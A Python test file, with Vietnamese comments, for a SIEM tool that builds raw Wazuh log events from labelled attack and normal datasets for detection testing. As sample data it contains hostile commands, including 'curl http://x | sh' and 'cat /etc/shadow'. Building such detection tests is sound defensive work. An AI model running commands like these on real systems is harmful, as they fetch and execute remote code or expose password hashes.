"""Dựng log thô Wazuh từ dataset (Task 20, siem/ai/wazuh_events.py)."""
import re

from siem.ai import wazuh_events as we
from siem.ai.golden import Labeled, PublicDatasets

PREMATCH = re.compile(r"^ossec: output: '[^']*': siem-proc: pid=\d+ ppid=")   # decoders/0102-siem-procs.xml


def test_siem_proc_event_matches_decoder_prematch():
    e = we.siem_proc_event(42, "/usr/bin/curl", "curl http://x | sh", "curl", "bash")
    head, body = e.msg.split("any->siem-procs:", 1)
    assert head == "1:[001] (sbx-42) " and PREMATCH.match(body) and "pid=42 " in body and e.fmt == "siem-proc"


def test_siem_proc_event_is_one_line_like_the_agent_script():
    # siem-procs đổi khoảng trắng trong name/parent/exe thành "_", exe vắng là "-"; một dòng = một event
    e = we.siem_proc_event(1, "", "a\nb\r\x00c", "my proc", "")
    assert "\n" not in e.msg and "\x00" not in e.msg
    assert "name=my_proc parent=- exe=- cmd=a b c" in e.msg


def test_sysmon_event_record_id_is_ident():
    e = we.sysmon_event(7, "C:\\Windows\\System32\\cmd.exe", "cmd /c whoami", "C:\\x.exe", "x", "LAB\\u")
    assert e.msg.startswith("f:EventChannel:") and "<EventRecordID>7</EventRecordID>" in e.msg


def test_apache_event_header():
    assert we.apache_event(9, "1.2.3.4 - - [x] \"GET / HTTP/1.1\" 200 1").msg.startswith(
        "1:[001] (sbx-9) any->/var/log/apache2/access.log:1.2.3.4 ")


def test_golden_events_builds_raw_per_dataset(tmp_path):
    web = {"message": '1.2.3.4 - - [x] "GET /a HTTP/1.1" 200 1'}
    win = {"process": {"executable": "C:\\W\\cmd.exe", "command_line": "cmd /c whoami",
                       "parent": {"executable": "C:\\x.exe", "command_line": "x"}}, "user": {"name": "LAB\\u"}}
    lin = {"process": {"executable": "/usr/bin/curl", "command_line": "curl x | sh", "name": "curl",
                       "parent": {"name": "bash"}}, "user": {"id": 0}}
    real = {"process": {"executable": "cat", "command_line": "cat /etc/shadow"}}          # splunk-attack-data: không dựng
    bg = {"process": {"executable": "/usr/bin/clear", "command_line": "clear", "parent": {"name": "bash"}},
          "user": {"id": "ubuntu"}}
    g = PublicDatasets(directory=tmp_path, attack=[
        Labeled(web, {"dataset": "csic2010"}), Labeled(win, {"dataset": "atomic-red-team", "platform": "windows"}),
        Labeled(lin, {"dataset": "atomic-red-team", "platform": "linux"}),
        Labeled(real, {"dataset": "splunk-attack-data", "platform": "linux"})],
        normal=[Labeled(bg, {"dataset": "scenario-background", "platform": "linux"})])
    ev = we.golden_events(g, tmp_path)
    assert set(ev) == {id(web), id(win), id(lin), id(bg)}
    assert len({e.ident for e in ev.values()}) == 4
    assert ev[id(web)].fmt == "apache" and ev[id(web)].msg.endswith(web["message"])
    assert ev[id(win)].fmt == "eventchannel" and "cmd /c whoami" in ev[id(win)].msg
    assert ev[id(lin)].fmt == "siem-proc" and "name=curl parent=bash exe=/usr/bin/curl cmd=curl x | sh" in ev[id(lin)].msg
    assert "uid=0 " in ev[id(bg)].msg                   # uid không phải số (tên user) -> 0, decoder cần uid=\d*
    assert id(bg) not in we.golden_events(g, tmp_path, extra_normal=False)


def test_generic_moved_from_wazuh_coverage():
    import sys
    from pathlib import Path
    sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "tools"))
    import wazuh_coverage as cov
    assert cov.GENERIC is we.GENERIC and "92032" in we.GENERIC and cov.sysmon_message is we.sysmon_message
